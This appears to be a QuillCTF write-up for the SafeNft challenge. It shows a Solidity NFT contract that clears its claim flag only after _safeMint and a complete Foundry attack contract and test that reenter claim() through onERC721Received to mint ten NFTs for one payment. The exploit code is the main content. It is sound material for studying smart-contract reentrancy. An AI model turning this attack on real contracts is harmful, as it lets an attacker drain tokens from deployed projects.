---
title: QuillCTF-4.SafeNft
date: 2024-01-22 17:00:34
tags:
categories: 
    - QuillCTF
---

## Objective

- Claim multiple NFTs for the price of one.

## Code

```solidity
// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.7;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/extensions/ERC721Enumerable.sol";

contract safeNFT is ERC721Enumerable {
    uint256 price;
    mapping(address=>bool) public canClaim;

    constructor(string memory tokenName, string memory tokenSymbol,uint256 _price) ERC721(tokenName, tokenSymbol) {
        price = _price; //price = 0.01 ETH
    }

    function buyNFT() external payable {
        require(price==msg.value,"INVALID_VALUE");
        canClaim[msg.sender] = true;
    }

    function claim() external {
        require(canClaim[msg.sender],"CANT_MINT");
        _safeMint(msg.sender, totalSupply()); 
        canClaim[msg.sender] = false;
    }
 
}
```
## Observation

Object is to claim multiple NFTs

we can find `_safeMint` function in `claim()` , so we can use reentrance.

## Attack

```solidity
// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "openzeppelin-contracts/contracts/token/ERC721/IERC721Receiver.sol";
import "../src/4-NFT/safeNFT.sol";

contract AttackerNFT is IERC721Receiver, Test {
    safeNFT _nft;
    bool public complete;
    address internal _owner;
    uint256 z = 1;

    constructor(address _safenft) {
        _nft = safeNFT(_safenft);
        _owner = msg.sender;
    }

    function Attacker() public payable {
        _nft.buyNFT{value: msg.value}();
        _nft.claim();

        uint256 balance = _nft.balanceOf(address(this));
        for (uint256 i = 0; i < balance; i++) {
            _nft.transferFrom(address(this), _owner, i);
            //console.log("transfered一次");
        }
    }

    function onERC721Received(address, address, uint256, bytes calldata) external override returns (bytes4) {
        if (z < 10) {
            z++;
            _nft.claim();
            // claiming the
        }
        return this.onERC721Received.selector;
    }
}

contract safeNftTest is Test {
    address public attacker;

    safeNFT public target;

    function setUp() public {
        attacker = makeAddr("attacker");

        vm.deal(attacker, 1 ether);

        target = new safeNFT("QuillCTF", "QNF", 0.01 ether);
    }

    function testAttackNFT() public {
        vm.startPrank(attacker);
        AttackerNFT attackNFT = new AttackerNFT(address(target));
        attackNFT.Attacker{value: 0.01 ether}();
        vm.stopPrank();
        uint256 attackerBalance;
        attackerBalance = target.balanceOf(attacker);
        assertEq(attackerBalance, 10);
        console.log("attackerBalance", attackerBalance);
    }
}
```